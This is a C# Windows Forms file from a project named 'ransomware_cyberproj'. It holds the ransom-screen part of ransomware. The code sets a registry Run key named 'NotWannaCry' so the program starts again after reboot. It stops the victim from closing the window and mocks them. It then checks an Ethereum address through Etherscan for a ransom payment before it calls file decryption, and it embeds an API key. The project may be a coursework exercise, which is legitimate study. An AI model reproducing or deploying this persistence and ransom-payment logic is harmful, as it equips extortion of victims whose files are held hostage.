using Microsoft.Win32;
using Newtonsoft.Json;
using System.Net;

namespace ransomware_cyberproj
{
    public partial class Form1 : Form
    {
        int close = 0;
        public Form1()
        {
            InitializeComponent();
            this.FormClosing += Form1_FormClosing;
        }
        private void SetStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("NotWannaCry", Application.ExecutablePath);

        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Check if the user is trying to close the form
            if (e.CloseReason == CloseReason.UserClosing)
            {
                if (close == 0)
                {
                    e.Cancel = true; // Cancel the close operation
                    MessageBox.Show("Closing...");
                    MessageBox.Show("hahahaha you thought");
                }
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
#if RELEASE
            SetStartup();
#endif
        }
        struct EtherScanListTransaction
        {
            public string status;
            public string message;
            public etherTransaction[] result;
        }
        struct etherTransaction
        {
            public string blockNumber;
            public string timeStamp;
            public string hash;
            public string nonce;
            public string blockHash;
            public string transactionIndex;
            public string from;
            public string to;
            public string value;
            public string gas;
            public string gasPrice;
            public string isError;
            public string txreceipt_status;
            public string input;
            public string contractAddress;
            public string cumulativeGasUsed;
            public string gasUsed;
            public string confirmations;
            public string methodId;
            public string functionName;
        }
        public string Get(string uri)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                return reader.ReadToEnd();
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            string returnedData = Get(@"https://api.etherscan.io/api?module=account&action=txlist&address=0x9fda774fd2b1933541da8de406af567a9b204592&startblock=0&endblock=99999999&page=1&offset=10&sort=asc&apikey=JBDQQM8GQW2NMTVYGAHJR7V7H2G4U76G5N");
            etherTransaction[] transactions = JsonConvert.DeserializeObject<EtherScanListTransaction>(returnedData).result;
            foreach (etherTransaction transaction in transactions)
            {
                if (transaction.from == textBox2.Text && transaction.to == textBox1.Text)
                {
                    MessageBox.Show("Money Receieved, click ok to decrypt all of your files :) sit back, drink beer and wait while all of your files are being decrypted");
                    Program.runDecryption();
                    close = 1;
                    Close();
                    return;
                }
            }
            MessageBox.Show("Payment has not been received D: no beer");
        }
    }
}